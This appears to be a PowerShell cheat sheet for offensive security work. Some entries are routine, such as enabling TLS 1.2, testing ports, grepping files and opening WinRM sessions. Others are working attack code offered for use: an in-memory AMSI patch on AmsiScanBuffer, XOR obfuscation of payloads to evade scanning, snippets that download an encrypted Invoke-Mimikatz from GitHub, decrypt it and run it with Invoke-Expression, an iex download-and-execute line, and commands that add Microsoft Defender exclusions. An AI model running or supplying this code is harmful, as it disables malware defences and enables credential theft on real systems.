# Table of Contents
- [Enable support of TLS 1.2](#enable-support-of-tls-12)
- [Download a script from an HTTP server](#download-a-script-from-an-http-server)
- [Test on open/close port](#test-on-openclose-port)
- [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
- [Payload encryption/decryption](#payload-encryptiondecryption)
  * [Encryption (not secure)](#encryption-not-secure)
  * [Decryption](#decryption)
- [How to grep in PowerShell](#how-to-grep-in-powershell)

# Enable support of TLS 1.2
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
```

# Download a script from an HTTP server
```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1')
```

# Test on open/close port
```powershell
Test-NetConnection -Port 389 -InformationLevel "Detailed" <ip> 
```

## Use a data structure for frequently used options
```powershell
$Parameters = @{
	"Port" = "389"
	"InformationLevel" = "Detailed"
	"ComputerName" = "localhost"
}
Test-NetConnection @Parameters
```

- [Test-NetConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection)

# Patching amsi.dll AmsiScanBuffer by rasta-mouse
```powershell
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
- [AMSI.fail](https://amsi.fail/)
- [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)
- [Small modification to Rastemouse's AmsiScanBuffer bypass to use bytes.](https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998)


# Payload encryption/decryption
## Encryption (cryptographically insecure)
```powershell
$FileIn = "C:\Windows\System32\calc.exe"
$FileOut = "C:\calc.exe.encrypted"
$Seed = 42 # seed between 0 and 2147483647

$Bytes = [io.file]::ReadAllBytes($FileIn) # Get-Content -Path $File -Encoding byte -Raw 

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

[io.file]::WriteAllBytes($FileOut,$Bytes)
```
## Decryption
```powershell
$FileIn = "C:\calc.exe.encrypted"
$FileOut = "C:\calc.exe"
$Seed = 42 # seed between 0 and 2147483647

$Bytes = [io.file]::ReadAllBytes($FileIn) # Get-Content -Path $File -Encoding byte -Raw 

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

[io.file]::WriteAllBytes($FileOut,$Bytes)
```

### Decrypt and invoke Invoke-Mimikatz.ps1 in PowerShell
```powershell
$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/' + 'okazymyrov/piki' + '/blob/master/Invoke' + '-Mimi' + 'katz.ps1.encrypted?raw=true')
$Seed = 42 # seed between 0 and 2147483647

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
```

### Decrypt and invoke Invoke-Mimikatz.ps1 in PowerShell
```powershell
$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/okazymyrov/piki/blob/master/Invoke-Mimikatz.ps1.encrypted?raw=true')
$Seed = 42 # seed between 0 and 2147483647

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
```

### Decrypt and invoke Invoke-Mimikatz.ps1 from the disk
```powershell
$FileIn = "C:\Users\Administrator\Downloads\Invoke-Mimikatz.ps1.encrypted"
$Seed = 42 # seed between 0 and 2147483647

$Bytes = [io.file]::ReadAllBytes($FileIn) # Get-Content -Path $File -Encoding byte -Raw 

Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
for($i=0;$i -lt $Bytes.Length;$i++)
{
    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
}

Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
```

# How to grep in PowerShell 

## Log files in the current directory
```powershell
Select-String -Path "*.log" -Pattern "EMAIL_ADDRESS"
```
- [How to Use PowerShell Grep (Select-String)](https://adamtheautomator.com/powershell-grep/)

## All files recursively
```powershell
Get-ChildItem -Recurse | Select-String -Pattern "EMAIL_ADDRESS" -List
```

# Generate 128-bit password
```powershell
New-Guid
```

# Connect to remote computer via WinRM
```powershell
$SecPassword = ConvertTo-SecureString "<password>" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("<domain.local>\<user>", $SecPassword)
New-PSSession -Credential $Cred -ComputerName <computer>.<domain.local>
```

# Manage Microsoft Defender for Endpoint

- [Add-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/add-mppreference)

## Get information about current settings
```powershell
powershell -NonInteractive -Command Get-MpPreference
```

## Add exclusions (require administrative rights)
```powershell
powershell -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\tmp"
powershell -NonInteractive -Command Add-MpPreference -ExclusionProcess "java.exe"
```
